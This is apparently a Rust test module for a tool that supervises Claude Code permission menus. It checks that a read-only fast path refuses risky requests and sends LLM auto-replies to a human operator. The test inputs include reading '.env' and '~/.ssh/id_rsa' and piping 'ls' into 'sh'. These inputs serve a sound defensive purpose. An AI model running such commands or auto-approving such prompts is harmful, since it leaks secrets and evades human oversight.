    // command sits far above the menu; hc status carries it as `msg: "approve Bash: <cmd>"`.
    const CLAUDE_TOUCH: &str = include_str!("fixtures/claude_permission_bash_touch.txt");

    #[test]
    fn fast_path_real_claude_touch_is_not_approved() {
        let msg = "approve Bash: touch /home/user/.claude/jobs/job1/tmp/real-claude/marcador.txt";
        assert_eq!(
            readonly_fast_path_with_msg(CLAUDE_TOUCH, Some("permission"), Some(msg)),
            None
        );
    }

    #[test]
    fn fast_path_reads_the_command_from_hc_status_msg_on_a_claude_menu() {
        // Built from the real format (no real capture: Claude does not prompt for reads by default).
        let screen = CLAUDE_TOUCH.replace(
            "touch /home/user/.claude/jobs/job1/tmp/real-claude/marcador.txt",
            "git diff --stat",
        );
        let got = readonly_fast_path_with_msg(
            &screen,
            Some("permission"),
            Some("approve Bash: git diff --stat"),
        );
        assert_eq!(got, Some(("1".into(), "git diff --stat".into())));
        let got = readonly_fast_path_with_msg(
            &screen,
            Some("permission"),
            Some("approve Read: README.md"),
        );
        assert_eq!(got, Some(("1".into(), "Read README.md".into())));
    }

    #[test]
    fn fast_path_status_msg_refusals() {
        let menu = "Do you want to proceed?\n❯ 1. Yes\n  2. Yes, and always allow\n  4. No";
        let f = |m: &str| readonly_fast_path_with_msg(menu, Some("permission"), Some(m));
        assert_eq!(f("approve Bash: cat .env"), None);
        assert_eq!(f("approve Bash: ls | sh"), None);
        assert_eq!(f("approve Write: notes.md"), None);
        assert_eq!(f("approve Edit: src/main.rs"), None);
        assert_eq!(f("approve Read: ~/.ssh/id_rsa"), None);
        // No visible prompt to answer: nothing is typed even if the msg looks safe.
        assert_eq!(
            readonly_fast_path_with_msg("working...", Some("permission"), Some("approve Bash: ls")),
            None
        );
        // Claude's folder-trust dialog has no "1. Yes" and no msg: never answered.
        assert_eq!(readonly_fast_path_with_msg("Do you trust the files in this folder?\n❯ 1. No, exit\n  2. Yes, I trust this folder", None, None), None);
    }

    #[test]
    fn sanitize_blocks_llm_auto_reply_on_claude_permission_menu() {
        let menu = "Bash command\n\n  ls -la src && find . -name '*.rs'\n\nDo you want to proceed?\n❯ 1. Yes\n  2. Yes, and don't ask again for ls/find in /home/user/project\n  3. No";

        // Fast path rejects `&&`, and LLM proposing `y` or `1` must become ALERT_OPERATOR.
        assert_eq!(readonly_fast_path_with_msg(menu, None, None), None);

        for payload in ["y", "1"] {
            let out = sanitize_auto_reply(menu, None, None, auto(payload));
            assert_eq!(
                out.decision,
                SupervisorDecision::AlertOperator,
                "payload {payload}"
            );
            assert_eq!(out.urgency, Urgency::Normal);
            assert!(out.hc_command_payload.is_empty());
            assert!(out
                .reason_for_operator
                .contains("pedido de permissão fora da lista de leitura"));
        }

        // Critical urgency is preserved when blocking a permission-menu auto-reply.
        let mut critical = auto("1");
        critical.urgency = Urgency::Critical;
        let out = sanitize_auto_reply(menu, None, None, critical);
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert_eq!(out.urgency, Urgency::Critical);
        assert!(out.hc_command_payload.is_empty());

        // Real Claude touch fixture with kind + msg is also blocked on the LLM path.
        let msg = "approve Bash: touch /home/user/.claude/jobs/job1/tmp/real-claude/marcador.txt";
        let out = sanitize_auto_reply(CLAUDE_TOUCH, Some("permission"), Some(msg), auto("1"));
        assert_eq!(out.decision, SupervisorDecision::AlertOperator);
        assert!(out.hc_command_payload.is_empty());
    }

    #[test]
    fn sanitize_blocks_llm_auto_reply_on_permission_kind_or_status_msg() {
        let yn = "Continue? [y/N]";
        let by_kind = sanitize_auto_reply(yn, Some("permission"), None, auto("y"));
        assert_eq!(by_kind.decision, SupervisorDecision::AlertOperator);
        assert!(by_kind.hc_command_payload.is_empty());

        let by_msg = sanitize_auto_reply(yn, None, Some("approve Bash: cargo build"), auto("y"));
        assert_eq!(by_msg.decision, SupervisorDecision::AlertOperator);
        assert!(by_msg.hc_command_payload.is_empty());

        // Plain yes/no prompt with no permission signal keeps today's behaviour.
        let plain = sanitize_auto_reply(yn, None, None, auto("y"));
        assert_eq!(plain.decision, SupervisorDecision::AutoReply);
        assert_eq!(plain.hc_command_payload, "y");
    }

    #[test]
    fn sanitize_rejects_yn_and_enter_on_numbered_menu() {
        let menu = "Do you want to proceed?\n1. Continue\n2. Abort";
        for bad in ["y", "yes", "n", "no", ""] {
            let out = sanitize_auto_reply(menu, None, None, auto(bad));
            assert_eq!(
                out.decision,
                SupervisorDecision::AlertOperator,
                "payload '{bad}' should be rejected on numbered menu"
            );
            assert!(out.hc_command_payload.is_empty());
        }
        let digit = sanitize_auto_reply(menu, None, None, auto("1"));
        assert_eq!(digit.decision, SupervisorDecision::AutoReply);
        assert_eq!(digit.hc_command_payload, "1");
    }
}
